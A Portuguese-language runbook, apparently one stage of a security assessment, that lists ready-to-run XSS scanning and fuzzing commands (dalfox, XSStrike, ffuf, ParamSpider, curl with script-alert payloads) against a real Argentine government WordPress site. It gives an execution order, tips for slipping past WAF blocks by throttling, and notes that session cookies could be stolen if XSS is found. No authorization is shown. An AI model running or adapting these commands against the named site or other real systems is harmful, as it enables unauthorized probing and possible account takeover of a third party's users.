# Comandos Manuais - Etapa 18: Teste de XSS

## Comandos Prontos para Execução

### 1. Dalfox - Teste em Endpoint Específico

```bash
# Teste básico
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test"

# Teste com formato JSON
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test" --format json -o etapa18_xss/dalfox_context.json

# Teste em múltiplos parâmetros
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test&password=test&id=test"
```

### 2. XSStrike - Scanner Especializado

```bash
# Teste básico
python C:\Sec\Tools\XSStrike\xsstrike.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test"

# Teste com crawling (profundidade 2)
python C:\Sec\Tools\XSStrike\xsstrike.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test" --crawl -l 2 -t 2

# Teste com output JSON
python C:\Sec\Tools\XSStrike\xsstrike.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test" --json -o etapa18_xss/xsstrike_results.json
```

### 3. ffuf - Fuzzing com Payloads XSS

```bash
# Fuzzing básico no parâmetro context
C:\Sec\Tools\ffuf\ffuf.exe -w etapa18_xss/xss_payloads_basic.txt -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=FUZZ" -fc 404,403 -t 2 -rate 3

# Fuzzing no parâmetro password
C:\Sec\Tools\ffuf\ffuf.exe -w etapa18_xss/xss_payloads_basic.txt -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=FUZZ" -fc 404,403 -t 2 -rate 3

# Fuzzing no parâmetro page_id
C:\Sec\Tools\ffuf\ffuf.exe -w etapa18_xss/xss_payloads_basic.txt -u "https://desarrolloyempleo.cba.gov.ar/?page_id=FUZZ" -fc 404,403 -t 2 -rate 3
```

### 4. ParamSpider - Descobrir Novos Parâmetros

```bash
# Descobrir URLs com parâmetros
cd C:\Sec\Tools\ParamSpider
python -m paramspider.main -d desarrolloyempleo.cba.gov.ar -o ..\..\reports\etapa18_xss\paramspider_xss_urls.txt
```

### 5. Dalfox Pipe - Testar URLs do ParamSpider

```bash
# Testar todas as URLs descobertas pelo ParamSpider
type reports\etapa18_xss\paramspider_xss_urls.txt | C:\Sec\Tools\dalfox.exe pipe --format json -o reports\etapa18_xss\dalfox_pipe_results.json
```

## Testes por Parâmetro Identificado

### Parâmetro `context` (WordPress REST API)
```bash
# Dalfox
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=<script>alert(1)</script>"

# XSStrike
python C:\Sec\Tools\XSStrike\xsstrike.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=test"
```

### Parâmetro `password` (WordPress REST API)
```bash
# Dalfox
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=<script>alert(1)</script>"

# ffuf
C:\Sec\Tools\ffuf\ffuf.exe -w etapa18_xss/xss_payloads_basic.txt -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=FUZZ" -fc 404,403
```

### Parâmetro `url` (oEmbed API - também testar SSRF)
```bash
# Dalfox
C:\Sec\Tools\dalfox.exe url "https://desarrolloyempleo.cba.gov.ar/wp-json/oembed/1.0/embed?url=<script>alert(1)</script>"

# XSStrike
python C:\Sec\Tools\XSStrike\xsstrike.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/oembed/1.0/embed?url=test"
```

### Parâmetro `page_id` (Query String)
```bash
# ffuf
C:\Sec\Tools\ffuf\ffuf.exe -w etapa18_xss/xss_payloads_basic.txt -u "https://desarrolloyempleo.cba.gov.ar/?page_id=FUZZ" -fc 404,403
```

## Testes Manuais com curl

### Teste básico de reflexão
```bash
curl -s "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=<script>alert(1)</script>" | grep -i "script\|alert"
```

### Teste com encoding
```bash
# URL encoded
curl -s "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=%3Cscript%3Ealert(1)%3C/script%3E" | grep -i "script\|alert"
```

## Ordem Recomendada de Execução

1. **Dalfox** nos endpoints principais (rápido, automatizado)
2. **XSStrike** nos endpoints mais promissores (técnicas avançadas)
3. **ffuf** com wordlist de payloads (fuzzing completo)
4. **ParamSpider** para descobrir novos parâmetros
5. **Dalfox pipe** nas URLs descobertas

## Observações Importantes

- ⚠️ **WAF CloudFront**: Pode bloquear requisições suspeitas (403 Forbidden)
- ⚠️ **Rate Limiting**: Usar delays entre requisições para evitar bloqueios
- ⚠️ **Contexto**: WordPress REST API geralmente sanitiza inputs, mas plugins podem ter vulnerabilidades
- ✅ **Missing CSP**: Facilita exploração de XSS se encontrado
- ✅ **Cookies sem httponly**: Se XSS for encontrado, cookies podem ser roubados
